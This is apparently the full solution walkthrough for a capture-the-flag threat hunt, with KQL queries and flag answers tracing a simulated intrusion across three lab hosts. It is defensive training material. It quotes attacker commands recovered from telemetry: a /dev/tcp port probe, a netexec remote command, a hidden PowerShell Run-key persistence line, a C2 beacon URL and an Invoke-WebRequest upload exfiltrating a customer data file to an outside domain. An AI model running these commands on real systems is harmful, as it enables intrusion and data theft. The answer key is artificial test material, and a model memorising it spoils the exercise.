# NORTHPEAK DESCENT — Walkthrough

> A phase-by-phase solve guide for the **NORTHPEAK DESCENT** community hunt (Hunt 10). Gate + 5 phases, 18 flags. Every finding here was recovered from live MDE telemetry in the `law-cyber-range` Sentinel workspace.
>
> **Spoiler warning.** This is the full solution. If you want to work the hunt yourself, stop here and open the brief instead.
>
> **Do not publish before the hunt closes.** Keep private until the event ends.

---

## How to read this

The hunt is gated: each flag unlocks the next, and the flags are grouped into a setup **gate** plus **five phases**. This guide follows that structure. For each flag you get:

- **What it asks** — the Hunt Lead's question, in plain terms
- **Method** — how to think about it, which table, why
- **Query** — the exact KQL that recovers the answer
- **Answer** — the value that scored

Two ground rules that apply to *every* query in this hunt:

**Scope to the estate, always.** This is a shared workspace. Every query is filtered to the three Northpeak hosts, or it returns other people's telemetry:

```kql
| where DeviceName has_any ("npt-ws01","npt-srv01","npt-linux01")
```

**Time window.** All activity falls on the evening of 16 June 2026 UTC. Queries below bound to `18:00 16 June → 02:00 17 June UTC` to stay tight; widen if your retention differs. Note the VMs run on UTC — Sentinel shows 12-hour time, so "11:04 PM" is `23:04 UTC`.

---

# GATE — Setup

**What it asks.** Confirm you're on the right workspace and have read the brief. Submit the readiness phrase.

**Method.** No telemetry. The phrase is carried in the brief itself. This gate exists to make you (a) land on `law-cyber-range` and (b) internalize the host-filter rule before you touch a single row.

**Answer.**
```
Northpeak hunter ready
```

---

# PHASE 01 — Initial Access

*The real entry, the order of the footholds, the operator's own client, and how the server was reached. The failed-logon storm is a decoy — work only successful, external authentications.*

---

### The real foothold

**What it asks.** One external address got onto the Windows estate cleanly and worked it interactively. Give the source and how they came through.

**Method.** Ignore the brute-force noise. Filter `DeviceLogonEvents` to **successful** logons, **RemoteInteractive** type (that's RDP / interactive session), from a **public** IP. One address survives.

```kql
DeviceLogonEvents
| where TimeGenerated between (datetime(2026-06-16 18:00:00) .. datetime(2026-06-17 02:00:00))
| where DeviceName has_any ("npt-ws01","npt-srv01")
| where ActionType == "LogonSuccess"
| where LogonType == "RemoteInteractive"
| where RemoteIPType == "Public"
| project TimeGenerated, DeviceName, AccountName, RemoteIP, LogonType
| sort by TimeGenerated asc
```

**Answer.** `148.64.103.173, RDP`
*(Source `148.64.103.173`, account `sancadmin`, arriving via RDP / RemoteInteractive.)*

---

### First foothold, ordering

**What it asks.** There's more than one foothold, and the obvious story has the Linux box first. Prove which one actually came first, and name it.

**Method.** This is the hunt's central trap. Put **all three hosts** on one timeline — successful, external logons, sorted by time. Drop the RemoteInteractive filter so the **Linux SSH** login (a `Network`-type logon via `sshd`) shows up too. Read the top row.

```kql
DeviceLogonEvents
| where TimeGenerated between (datetime(2026-06-16 18:00:00) .. datetime(2026-06-17 02:00:00))
| where DeviceName has_any ("npt-ws01","npt-srv01","npt-linux01")
| where ActionType == "LogonSuccess"
| where RemoteIPType == "Public"
| project TimeGenerated, DeviceName, AccountName, RemoteIP, LogonType, InitiatingProcessFileName
| sort by TimeGenerated asc
```

The timeline inverts the assumption:

| Time (UTC) | Host | Type |
|---|---|---|
| **20:57** | **npt-ws01** | Network → **first** |
| 20:58 | npt-ws01 | RemoteInteractive (RDP) |
| 21:58 | npt-srv01 | RDP |
| 22:01 | npt-linux01 | Network (sshd) — an hour *later* |

**Answer.** `npt-ws01, 148.64.103.173`
*(Windows came first. The tidy "Linux → Windows" kill chain is backwards — this is exactly what the brief warns you not to assume.)*

---

### Operator workstation name

**What it asks.** Something they connected *with* announced itself on every remote session. Name it.

**Method.** The RDP client leaks its own hostname. It's **not** in `AdditionalFields` (that only carries token flags) and **not** in the network table (only MACs). It lives in the `RemoteDeviceName` column — but that column is empty on many rows, so target it directly with `isnotempty()`.

```kql
DeviceLogonEvents
| where TimeGenerated between (datetime(2026-06-16 18:00:00) .. datetime(2026-06-17 02:00:00))
| where DeviceName has_any ("npt-ws01","npt-srv01","npt-linux01")
| where isnotempty(RemoteDeviceName)
| distinct RemoteDeviceName, DeviceName, AccountName, RemoteIP
```

**Answer.** `loranse`
*(The operator's workstation, repeating across every session — under both the `sancadmin` and `herbijidodo` accounts.)*

---

### SRV01 access vector

**What it asks.** The server took its own way in — it wasn't reached from inside. Reconstruct it: method, source, session type.

**Method.** Scope to SRV01 alone. Successful RemoteInteractive from a public IP. If it were an internal pivot the source would be `10.2.0.x`; a public source proves external.

```kql
DeviceLogonEvents
| where TimeGenerated between (datetime(2026-06-16 18:00:00) .. datetime(2026-06-17 02:00:00))
| where DeviceName has "npt-srv01"
| where ActionType == "LogonSuccess"
| where LogonType == "RemoteInteractive"
| project TimeGenerated, DeviceName, AccountName, RemoteIP, RemoteIPType, LogonType
| sort by TimeGenerated asc
```

**Answer.** `RDP, 148.64.103.173, RemoteInteractive`
*(SRV01 was reached directly from outside — a parallel external foothold, not an internal hop.)*

---

# PHASE 02 — Linux Recon & Tooling

*Escalation checks, reachability testing without a scanner, and what they installed to pivot. All on `npt-linux01`, in `DeviceProcessEvents`.*

---

### Sudo enumeration

**What it asks.** First thing on Linux, they checked what they could escalate with. Give the exact command — and note they fumbled it once before getting it right.

**Method.** Search Linux process command lines for `sudo`, sorted by time. Two near-identical entries appear: a typo, then the correction. The real one is the second.

```kql
DeviceProcessEvents
| where TimeGenerated between (datetime(2026-06-16 18:00:00) .. datetime(2026-06-17 02:00:00))
| where DeviceName has "npt-linux01"
| where ProcessCommandLine has "sudo"
| project TimeGenerated, AccountName, ProcessCommandLine
| sort by TimeGenerated asc
```

The fumble is visible: `sudo -1` (digit one) at 22:11, then `sudo -l` (letter L) at 22:16.

**Answer.** `sudo -l`

---

### Reachability technique

**What it asks.** They checked whether the Windows boxes were reachable before pivoting, without dropping a tool. How did they check, and the one port they cared about?

**Method.** No scanner binary means a bash built-in. Search for `/dev/tcp` — a pseudo-device that opens a raw TCP socket from the shell alone.

```kql
DeviceProcessEvents
| where TimeGenerated between (datetime(2026-06-16 18:00:00) .. datetime(2026-06-17 02:00:00))
| where DeviceName has "npt-linux01"
| where ProcessCommandLine has "/dev/tcp"
| project TimeGenerated, AccountName, ProcessCommandLine
| sort by TimeGenerated asc
```

Two `timeout 2 bash -c "echo > /dev/tcp/<ip>/3389"` lines — WS01 and SRV01, both on 3389.

**Answer.** `/dev/tcp, 3389`
*(Port 3389 = RDP = the lateral move they were about to make.)*

---

### Operator tooling

**What it asks.** They checked for a couple of capabilities, then committed to installing one tool. Name what they installed.

**Method.** Search Linux processes for `pipx`, and exclude the Azure guest-config noise (`GuestConfig`) that otherwise floods any `install` search. You'll see the wheel build, a `nxc --version` capability check, then the tool in use.

```kql
DeviceProcessEvents
| where TimeGenerated between (datetime(2026-06-16 18:00:00) .. datetime(2026-06-17 02:00:00))
| where DeviceName has "npt-linux01"
| where ProcessCommandLine has "pipx"
| where ProcessCommandLine !has "GuestConfig"
| project TimeGenerated, AccountName, ProcessCommandLine
| sort by TimeGenerated asc
```

The chain ends with `nxc smb 10.2.0.10 -u sancadmin ...` — netexec in action.

**Answer.** `netexec`
*(Binary is `nxc`; installed via `pipx`.)*

---

# PHASE 03 — Pivot, Execution & Persistence

*The internal hop, the operator's hands-on shells against the automation noise, and what they planted to survive a reboot.*

---

### Lateral movement triple

**What it asks.** Now they come back at the workstation from inside the network. Build the hop: account, internal source, target.

**Method.** This is the key cross-table lesson. `netexec`/`wmiexec` leaves **no interactive logon** — it will not be in `DeviceLogonEvents`. It surfaces in `DeviceNetworkEvents` as `InboundConnectionAccepted` on the target, from the Linux internal IP.

```kql
DeviceNetworkEvents
| where TimeGenerated between (datetime(2026-06-16 18:00:00) .. datetime(2026-06-17 02:00:00))
| where DeviceName has "npt-ws01"
| where RemoteIP == "10.2.0.30"
| where ActionType == "InboundConnectionAccepted"
| project TimeGenerated, DeviceName, RemoteIP, RemotePort, InitiatingProcessFileName
| sort by TimeGenerated asc
```

Cross-confirmed by the Linux-side command `nxc smb 10.2.0.10 -u sancadmin -x "whoami /all"` at 22:37.

**Answer.** `sancadmin, 10.2.0.30, npt-ws01`

---

### Operator PowerShell lineage

**What it asks.** The workstation is drowning in PowerShell, nearly all of it the machine talking to itself. Separate the human at the keyboard from the noise — what gives them away?

**Method.** Group every PowerShell process by its **parent** and account. Automation runs as `system` under service parents (`senseir.exe`, `gc_worker.exe`, `svchost`). A human on an RDP desktop launches PowerShell from **`explorer.exe`** — a machine never does.

```kql
DeviceProcessEvents
| where TimeGenerated between (datetime(2026-06-16 18:00:00) .. datetime(2026-06-17 02:00:00))
| where DeviceName has "npt-ws01"
| where FileName in~ ("powershell.exe","pwsh.exe")
| summarize count() by InitiatingProcessFileName, InitiatingProcessAccountName
| sort by count_ desc
```

The tell: `explorer.exe → powershell.exe` under `sancadmin`. Everything else is `system`.

**Answer.** `explorer.exe`

---

### Persistence full command

**What it asks.** They tried the staging script a few times, then made it survive a reboot. Give the full command they planted, path and all.

**Method.** Auto-start at logon → the Run key. Query `DeviceRegistryEvents` for `RegistryValueSet` under `CurrentVersion\Run`. The full command sits in `RegistryValueData` — copy it verbatim.

```kql
DeviceRegistryEvents
| where TimeGenerated between (datetime(2026-06-16 18:00:00) .. datetime(2026-06-17 02:00:00))
| where DeviceName has "npt-ws01"
| where RegistryKey has "CurrentVersion\\Run"
| where ActionType == "RegistryValueSet"
| project TimeGenerated, RegistryValueName, RegistryValueData, InitiatingProcessAccountName
| sort by TimeGenerated asc
```

Value name `NorthpeakSyncTray`, written by `sancadmin` at 23:04.

**Answer.**
```
powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File "C:\ProgramData\Northpeak\NorthpeakSync\Bin\NorthpeakSyncTray.ps1"
```

---

### Confirming the foothold's rights

**What it asks.** When the operator returns to the workstation a second time, before touching anything they run a short burst to check who they are and what they can do. The last command isn't a plain identity check — it tests for one specific thing. What were they confirming about their account?

**Method.** Look at the second-visit window (after the `Unlock` around 22:42). List the identity/recon burst in order. The last command carries a flag the others don't.

```kql
DeviceProcessEvents
| where TimeGenerated between (datetime(2026-06-16 22:40:00) .. datetime(2026-06-16 23:05:00))
| where DeviceName has "npt-ws01"
| where InitiatingProcessAccountName == "sancadmin"
| where FileName in~ ("whoami.exe","hostname.exe","net.exe","net1.exe","cmd.exe","powershell.exe")
| project TimeGenerated, FileName, ProcessCommandLine
| sort by TimeGenerated asc
```

The burst: `whoami` → `hostname` → **`whoami /groups`**. The last one enumerates group membership, not plain identity — they were confirming they were in the local admins.

**Answer.** `Administrators group, membership`

---

# PHASE 04 — Command & Control

*The look-alike channel: the one domain the network saw, the two that were hidden, the decode, the discrimination against system noise, and what the rhythm proves.*

---

### Beacon domains, cross-source

**What it asks.** The channel ran on three look-alike subdomains, but the network record only caught one. Find all three, in first-contact order, and say where the other two were hiding.

**Method.** Two tables. The network table shows only the domain that resolved (we can see it hit `192.0.2.1`). The process table holds all three, in the `Invoke-WebRequest` command lines.

Network — one domain only:

```kql
DeviceNetworkEvents
| where TimeGenerated between (datetime(2026-06-16 18:00:00) .. datetime(2026-06-17 02:00:00))
| where DeviceName has_any ("npt-ws01","npt-srv01")
| where RemoteUrl has "northpeak"
| project TimeGenerated, DeviceName, RemoteUrl, RemoteIP
| sort by TimeGenerated asc
```

Process — all three, ordered by first contact:

```kql
DeviceProcessEvents
| where TimeGenerated between (datetime(2026-06-16 18:00:00) .. datetime(2026-06-17 02:00:00))
| where DeviceName has_any ("npt-ws01","npt-srv01")
| where ProcessCommandLine has "northpeak"
| project TimeGenerated, DeviceName, ProcessCommandLine
| sort by TimeGenerated asc
```

Order: `status` (23:15:47) → `updates` (23:15:49) → `cdn` (23:44:08, the SRV01 exfil). Network saw only `status`.

**Answer.**
```
status.sync-northpeak.com, updates.sync-northpeak.com, cdn.sync-northpeak.com; DeviceProcessEvents
```

---

### Encoded beacon decode

**What it asks.** One beacon was wrapped to hide where it was calling. Unwrap it — full address, every parameter.

**Method.** Pull `-EncodedCommand` blobs and decode with `base64_decode_tostring()`. Watch out: the UTF-16LE decode can carry null bytes that break a `has "northpeak"` filter, so decode **without** that filter and read the results (or you'll get an empty table and think you failed).

```kql
DeviceProcessEvents
| where TimeGenerated between (datetime(2026-06-16 18:00:00) .. datetime(2026-06-17 02:00:00))
| where DeviceName has_any ("npt-ws01","npt-srv01")
| where ProcessCommandLine has "-EncodedCommand"
| extend Blob = extract(@"(?i)-EncodedCommand\s+([A-Za-z0-9+/=]+)", 1, ProcessCommandLine)
| extend Decoded = base64_decode_tostring(Blob)
| distinct ProcessCommandLine, Decoded
```

Among the results, the operator's blob decodes to `Invoke-WebRequest -Uri "https://cdn.sync-northpeak.com/..."`.

**Answer.**
```
https://cdn.sync-northpeak.com/api/beacon?id=NPT-WS01&flag=NORTHPEAK-09
```

---

### Encoded-command discrimination

**What it asks.** Pull every wrapped command and most are innocent system chatter, not the operator. Name what generates that chatter, and prove you can tell it apart.

**Method.** Group the encoded commands by parent process. One parent dominates the count with `system`-account chatter; the operator's few are `powershell.exe` under `sancadmin`.

```kql
DeviceProcessEvents
| where TimeGenerated between (datetime(2026-06-16 18:00:00) .. datetime(2026-06-17 02:00:00))
| where DeviceName has_any ("npt-ws01","npt-srv01")
| where ProcessCommandLine has "-EncodedCommand" or ProcessCommandLine has "-encodedCommand"
| summarize count() by InitiatingProcessFileName, InitiatingProcessAccountName
| sort by count_ desc
```

`gc_worker.exe` (system) = 24 encoded commands, all decoding to `[Environment]::OSVersion` inventory checks. Operator = 3, under `powershell.exe`/`sancadmin`, decoding to the beacon. Three-layer tell: parent, account, decoded content.

**Answer.** `gc_worker.exe`

---

### Beacon rhythm

**What it asks.** Look at the spacing between the early check-ins to the first domain. Don't give a number — say what the rhythm proves about what's driving the channel.

**Method.** Compute the gaps between `status` check-ins with `prev()` + `datetime_diff`. A fixed interval means an automated implant; an irregular one means a human firing commands by hand.

```kql
DeviceProcessEvents
| where TimeGenerated between (datetime(2026-06-16 18:00:00) .. datetime(2026-06-17 02:00:00))
| where DeviceName has "npt-ws01"
| where ProcessCommandLine has "status.sync-northpeak.com"
| project TimeGenerated, ProcessCommandLine
| sort by TimeGenerated asc
| extend GapSeconds = datetime_diff('second', TimeGenerated, prev(TimeGenerated, 1))
| project TimeGenerated, GapSeconds
```

The gap is ~38 seconds and irregular — no steady timer.

**Answer.** `inconsistent intervals, human operator (not automation)`

---

# PHASE 05 — Impact & Judgement

*The theft, the session it left in, and the model that let them operate freely without touching the security stack.*

---

### Crown jewel exfil

**What it asks.** Last thing they did was take the crown jewels out. Name the file, the host it left from, and where it went.

**Method.** On SRV01, find the upload command. Note the `wermgr.exe -upload` rows are Windows Error Reporting noise — the real one is the `powershell.exe` + `Invoke-WebRequest -InFile`.

```kql
DeviceProcessEvents
| where TimeGenerated between (datetime(2026-06-16 18:00:00) .. datetime(2026-06-17 02:00:00))
| where DeviceName has "npt-srv01"
| where ProcessCommandLine has "customer_data" or ProcessCommandLine has "InFile"
| project TimeGenerated, DeviceName, ProcessCommandLine
| sort by TimeGenerated asc
```

At 23:44: `Invoke-WebRequest -Uri 'https://cdn.sync-northpeak.com/api/upload...' -InFile 'C:\temp\customer_data_export_20260616.csv'`.

**Answer.** `customer_data_export_20260616.csv, npt-srv01, cdn.sync-northpeak.com`

---

### Exfil session correlation

**What it asks.** The export went out while they were live in a remote session on the server — and there were two. Which one were they in: the first, or the one they came back through?

**Method.** List SRV01's RemoteInteractive logons and compare their times to the exfil timestamp (23:44:08).

```kql
DeviceLogonEvents
| where TimeGenerated between (datetime(2026-06-16 18:00:00) .. datetime(2026-06-17 02:00:00))
| where DeviceName has "npt-srv01"
| where AccountName == "sancadmin"
| where LogonType == "RemoteInteractive"
| project TimeGenerated, LogonType, ActionType, RemoteIP
| sort by TimeGenerated asc
```

Session 1 at 21:58, session 2 (re-entry) at 23:42. Exfil at 23:44 — ~76 seconds into the **second** session.

**Answer.** `second`

---

### Holding the ground

**What it asks.** They were hands-on for hours and nothing tripped. Did they tear the defences down? They didn't. Name the model — what let them operate this freely without going near the security stack. Two halves: the absence, and what they used instead.

**Method.** This is a negative finding. Search all hosts for defense tampering and dropped binaries — and confirm there are none. (The only `disable-` hits are pip's own `--disable-pip-version-check`, part of the netexec install, not tampering.)

```kql
DeviceProcessEvents
| where TimeGenerated between (datetime(2026-06-16 18:00:00) .. datetime(2026-06-17 02:00:00))
| where DeviceName has_any ("npt-ws01","npt-srv01","npt-linux01")
| where ProcessCommandLine has_any ("Add-MpPreference","Set-MpPreference","DisableRealtimeMonitoring","ExclusionPath","ExclusionProcess","Stop-Service","Uninstall-")
| project TimeGenerated, DeviceName, ProcessCommandLine
| sort by TimeGenerated asc
```

Empty of real tampering. Everything the operator did used legitimate access and tools already on the hosts — living off the land. The quiet wasn't achieved by disabling anything; it came from being a trusted, valid account.

**Answer.** `no tampering, living off the land`
*(MITRE tactic: Defense Evasion — characterized here by the* absence *of tampering, i.e. valid-account operation, T1078.)*

---

## The chain, end to end

Entry → pivot → persistence → C2 → impact, as the evidence proves it:

1. **External RDP** onto **WS01** (20:57) from `148.64.103.173`, workstation `loranse`, account `sancadmin` — *before* any Linux activity.
2. **External RDP** onto **SRV01** (21:58) from the same address — a parallel external foothold, not an internal hop.
3. **External SSH** onto **Linux** (22:01); recon (`sudo -l`), reachability via `/dev/tcp` on 3389, and `netexec` installed via pipx.
4. **Internal pivot** Linux → WS01 (22:32) over SMB/`wmiexec` — visible only in the network table, not the logon table.
5. **Persistence** on WS01: hidden-PowerShell Run key `NorthpeakSyncTray` (23:04), after hands-on shells spawned from `explorer.exe`.
6. **C2** to three look-alike subdomains (`status`, `updates`, `cdn`) — only `status` seen on the network, the others in process command lines, one base64-wrapped; irregular, human-driven cadence; system `gc_worker.exe` chatter filtered out.
7. **Impact** on SRV01 (23:44, in the second/re-entry session): `customer_data_export_20260616.csv` exfiltrated to `cdn.sync-northpeak.com`.
8. **The model**: no defense tampering, no dropped binaries — living off the land on a valid, trusted account.

---

*NORTHPEAK DESCENT // Hunt 10 // Walkthrough // 18 flags // gate + 5 phases // law-cyber-range*
